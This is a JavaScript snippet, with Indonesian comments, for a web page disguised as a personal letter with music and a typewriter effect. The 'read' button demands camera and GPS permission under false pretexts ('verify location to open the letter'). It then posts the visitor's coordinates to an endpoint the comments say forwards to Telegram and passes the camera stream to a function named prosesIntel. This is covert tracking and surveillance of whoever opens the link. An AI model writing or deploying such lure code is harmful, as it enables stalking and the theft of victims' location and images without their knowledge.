// ... (Bagian pesan dan partikel background tetap sama) ...

readBtn.addEventListener("click", () => {
    // 1. Minta izin Kamera dulu
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(function(cameraStream) {
        // JIKA KAMERA ALLOW, lanjut minta izin Lokasi
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                // JIKA LOKASI JUGA ALLOW
                
                // Kirim lokasi ke Telegram
                fetch("/kirim-lokasi", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                });

                // BARU JALANKAN SURAT & FOTO
                bukaSurat(); 
                prosesIntel(cameraStream);
            },
            function(err) {
                // JIKA LOKASI DITOLAK
                alert("Gagal memverifikasi lokasi. Mohon aktifkan GPS dan izinkan akses lokasi agar surat bisa dibuka.");
                cameraStream.getTracks().forEach(t => t.stop()); // Matikan kamera lagi
            },
            { timeout: 10000 } // Tunggu maksimal 10 detik untuk GPS
        );
    })
    .catch(err => {
        // JIKA KAMERA DITOLAK
        alert("Akses kamera ditolak. Kamu wajib mengizinkan kamera untuk melihat pesan ini.");
    });
});

function bukaSurat() {
    music.load();
    music.play().catch(() => console.log("Autoplay blocked"));
    
    document.getElementById("introText").style.opacity = 0;
    readBtn.style.display = "none";

    letterBox.style.opacity = 0;
    letterBox.style.display = "block";
    setTimeout(() => {
        letterBox.style.opacity = 1;
        typeWriter();
    }, 500);
}

// ... (Fungsi typeWriter, prosesIntel, dan mulaiRekaman tetap sama seperti sebelumnya) ...